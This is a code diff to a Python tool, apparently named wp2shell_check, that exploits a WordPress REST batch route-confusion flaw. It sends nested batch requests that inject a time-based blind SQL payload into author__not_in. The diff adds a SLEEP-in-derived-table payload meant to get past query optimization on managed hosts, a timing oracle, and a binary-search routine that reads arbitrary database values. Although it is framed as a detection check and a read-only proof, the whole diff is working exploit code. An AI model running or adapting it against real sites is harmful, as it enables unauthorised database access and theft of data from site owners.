@@ -48,7 +48,8 @@ class Target:
         self.timeout = timeout
         self.sleep = float(sleep)
         self.route = route
-        self.batch = None  # resolved endpoint URL
+        self.batch = None   # resolved endpoint URL
+        self._base = 0.0    # measured baseline round-trip (set by detect(); used by the oracle)
         opener_handlers = []
         if proxy:
             opener_handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
@@ -76,24 +77,31 @@ class Target:
         return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]
 
     # -- payload ------------------------------------------------------------
+    # The injected value breaks out of `post_author NOT IN ( <value> )` and wraps SLEEP
+    # in a derived table:  (SELECT 1 FROM (SELECT SLEEP(n))x)  -- so MySQL materializes
+    # and evaluates it once, independent of the number of rows the posts query returns.
+    # A bare `NOT IN (SELECT SLEEP(n))` / `OR SLEEP(n)` gets optimized away and never
+    # executes on some managed WordPress hosts, which reads as a false negative. The
+    # nested subquery avoids that.
     @staticmethod
-    def _envelope(author_exclude_expr):
-        """Nested batch that lands `author_exclude_expr` in WP_Query::author__not_in."""
-        enc = urllib.parse.quote(author_exclude_expr, safe="")
+    def _envelope(author_exclude):
+        """Nested batch (route confusion) that lands `author_exclude` in WP_Query::author__not_in."""
+        enc = urllib.parse.quote(author_exclude, safe="")
         inner = {"requests": [
-            {"method": "GET", "path": "http://:"},                       # misalignment trigger
-            {"method": "GET", "path": "/wp/v2/categories?author_exclude=" + enc},
-            {"method": "GET", "path": "/wp/v2/posts"},                   # supplies get_items handler
+            {"method": "POST", "path": "///"},                            # misalignment trigger
+            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
+            {"method": "GET",  "path": "/wp/v2/posts"},                   # supplies get_items handler
         ]}
         return {"requests": [
-            {"method": "POST", "path": "http://:"},
-            {"method": "POST", "path": "/wp/v2/posts", "body": inner},   # self-call onto batch handler
-            {"method": "POST", "path": "/batch/v1"},
+            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
+            {"method": "POST", "path": "///", "body": {"name": "x"}},
+            {"method": "POST", "path": "/wp/v2/posts", "body": inner},    # self-call onto batch handler
+            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
         ]}
 
-    def probe(self, expr):
-        """Send one injection carrying <expr> as author_exclude. Returns (status, elapsed)."""
-        body = json.dumps(self._envelope(expr)).encode()
+    def probe(self, author_exclude):
+        """Send one injection carrying <author_exclude> into author__not_in. Returns (status, elapsed)."""
+        body = json.dumps(self._envelope(author_exclude)).encode()
         headers = {"Content-Type": "application/json", "User-Agent": "wp2shell_check/%s" % __version__}
         if self.batch is None:
             # resolve which endpoint form the site accepts (a processed batch answers 207/200)
@@ -107,21 +115,27 @@ class Target:
         st, el, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
         return st, el
 
+    @staticmethod
+    def _sleep_payload(seconds):
+        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds
+
     # -- detection ----------------------------------------------------------
     def detect(self, rounds=3):
-        fast = statistics.median(self.probe("SELECT 0")[1] for _ in range(rounds))
-        slow = statistics.median(self.probe("SELECT SLEEP(%g)" % self.sleep)[1] for _ in range(rounds))
+        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
+        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
+        self._base = fast
         delta = slow - fast
         # vulnerable if the slow path tracks our injected sleep and the fast path did not
         vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
         return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}
 
     # -- bounded read-only proof -------------------------------------------
-    def _oracle(self, cond, unit=0.5):
-        _, el = self.probe("SELECT IF((%s),SLEEP(%g),0)" % (cond, unit))
-        return el > (unit * 0.6)
+    def _oracle(self, cond, unit=0.6):
+        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
+        _, el = self.probe(payload)
+        return el > (self._base + unit * 0.6)   # relative to measured baseline (latency-safe)
 
-    def read_scalar(self, expr, maxlen=40, unit=0.5):
+    def read_scalar(self, expr, maxlen=40, unit=0.6):
         v = "COALESCE((%s),'')" % expr
         lo, hi = 0, maxlen
         while lo < hi:
